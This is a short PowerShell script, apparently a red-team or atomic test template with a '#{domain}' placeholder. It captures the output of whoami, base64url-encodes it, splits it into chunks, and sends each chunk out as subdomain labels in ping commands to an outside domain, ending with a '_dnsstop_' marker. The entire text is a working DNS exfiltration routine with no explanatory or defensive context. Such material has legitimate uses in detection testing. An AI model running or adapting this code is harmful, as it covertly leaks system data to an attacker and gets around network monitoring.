function ConvertTo-Base64String([string]$string){
$byteArray = [System.Text.UnicodeEncoding]::Unicode.GetBytes($string)
[Convert]::ToBase64String($byteArray)}
whoami >1.txt
$cmd=type 1.txt
$domain='#{domain}'
$os='w1'
$b64cmd=ConvertTo-Base64String($cmd)
$b64cmd=$b64cmd -replace "="
$b64cmd=$b64cmd -replace "\+","-"
$b64cmd=$b64cmd -replace "/","_"
$b64cmd_list=$b64cmd -split "(.{63})"|Where-Object {$_ -ne ""}
$rand_str=-join ([char[]](65..90+97..122)|Get-Random -Count 6)
$count=0
foreach($i in $b64cmd_list){
$b64domain="{0}.{1}.{2}.{3}" -f $rand_str,$count,$i,$domain
$ScriptBlock=[scriptblock]::Create("ping -n 1 $b64domain")
$job=Start-Job -ScriptBlock $ScriptBlock
$job|Wait-Job -Timeout 5
if($job.State -ne 'Completed'){$job|Stop-Job|Remove-Job}    
$count+=1}
$b64domain="{0}.{1}.{2}.{3}" -f $rand_str,$count,'_dnsstop_',$domain
$ScriptBlock=[scriptblock]::Create("ping -n 1  $b64domain")
$job=Start-Job -ScriptBlock $ScriptBlock
$job|Wait-Job -Timeout 5
if($job.State -ne 'Completed'){$job|Stop-Job|Remove-Job}   
exit 100